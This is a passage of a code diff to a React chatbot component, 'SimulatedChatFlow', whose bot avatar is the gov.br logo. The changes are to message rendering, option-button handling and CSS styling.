               <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
             )}
             <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
-              {msg.text}
+              {msg.text && <span style={{whiteSpace: 'pre-line'}}>{msg.text}</span>}
               {msg.sender === 'bot' && msg.options && !isBotTyping && (
-                <div className="options-container" style={{ marginTop: '10px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                <div className="options-container" style={{ marginTop: msg.text ? '10px' : '0', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                   {msg.options.map(opt => (
                     <button
-                      key={opt.value}
-                      onClick={() => handleOptionClick(opt.value, opt.nextStep)}
+                      key={opt.text} // Using text as key for simplicity, ensure unique if text can repeat
+                      onClick={() => handleOptionClick(opt)}
                       className="chat-option-button"
                     >
                       {opt.text}
@@ -398,6 +584,7 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
           border-radius: 50%;
           margin-right: 8px;
           margin-top: 4px; 
+          align-self: flex-start; /* Ensure avatar stays at the top of the message bubble */
         }
         .user-message-container .bot-avatar { 
           display: none;
@@ -408,10 +595,11 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
           line-height: 1.4;
           font-size: 15px;
           word-wrap: break-word;
+          box-shadow: 0 1px 2px rgba(0,0,0,0.1);
         }
         .bot-message {
-          background-color: #f1f0f0; 
-          color: #000;
+          background-color: #fff; 
+          color: #333;
           border-top-left-radius: 4px;
         }
         .user-message {
@@ -443,6 +631,7 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
           text-align: left;
           width: auto; 
           display: inline-block; 
+          box-shadow: 0 1px 1px rgba(0,0,0,0.05);
         }
         .chat-option-button:hover {
           background-color: #007bff;
@@ -470,6 +659,9 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
         @keyframes bounce {
             0%, 80%, 100% { transform: scale(0); }
             40% { transform: scale(1); }
+        }
+        .display-message-block .bot-message { /* Ensure displayMessage blocks span more width */
+            width: 100%; /* Make the bubble take more width */
         }
       `}</style>
     </div>
